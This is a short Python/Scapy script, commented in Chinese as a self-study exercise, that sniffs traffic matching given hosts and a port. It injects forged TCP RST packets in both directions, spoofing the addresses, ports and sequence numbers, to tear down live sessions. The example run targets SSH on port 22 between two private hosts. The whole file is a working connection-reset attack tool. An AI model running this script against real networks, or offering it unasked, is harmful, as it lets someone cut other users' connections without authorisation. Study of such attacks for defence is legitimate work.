#!/usr/bin/env python3
# -*- encoding = utf-8 -*-
# 该代码由本人学习时编写，仅供自娱自乐！
# 本人QQ：1945962391
# 欢迎留言讨论，共同学习进步！

from scapy.all import *
from Tools.Scapy_IFACE import scapy_iface
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错


def tcp_monitor_callback(pkt):
    # 本代码主要任务: 对传入的数据包,发送TCP Rest进行会话重置
    source_mac = pkt[Ether].fields['src']
    destination_mac = pkt[Ether].fields['dst']
    source_ip = pkt[IP].fields['src']
    destination_ip = pkt[IP].fields['dst']
    source_port = pkt[TCP].fields['sport']
    destination_port = pkt[TCP].fields['dport']
    seq_sn = pkt[TCP].fields['seq']
    ack_sn = pkt[TCP].fields['ack']

    a = Ether(src=source_mac, dst=destination_mac) / IP(src=source_ip, dst=destination_ip) / TCP(dport=destination_port,
                                                                                                 sport=source_port,
                                                                                                 flags=4, seq=seq_sn)
    b = Ether(src=destination_mac, dst=source_mac) / IP(src=destination_ip, dst=source_ip) / TCP(dport=source_port,
                                                                                                 sport=destination_port,
                                                                                                 flags=4, seq=ack_sn)
    sendp(a,
          iface=global_if,  # Windows环境不能使用iface参数
          verbose=False)
    sendp(b,
          iface=global_if,  # Windows环境不能使用iface参数
          verbose=False)


def tcp_reset(src_ip, dst_ip, dst_port, ifname, src_port=None):
    # 本代码主要任务: 搜索匹配过滤条件的数据包,然后使用tcp_monitor_callback方法进行重置会话处理
    global global_if
    global_if = scapy_iface(ifname)
    if src_port is None:
        match = "src host " + src_ip + " and dst host " + dst_ip + " and dst port " + dst_port
    else:
        match = "src host " + src_ip + " and dst host " + dst_ip + " and src port " + src_port + " and dst port " + dst_port
    print("开始匹配异常流量" + match)
    sniff(prn=tcp_monitor_callback,
          filter=match,
          iface=global_if,
          store=0)


if __name__ == "__main__":
    # 使用Linux解释器 & WIN解释器
    tcp_reset('192.168.98.29', '192.168.98.66', '22', 'ens33')
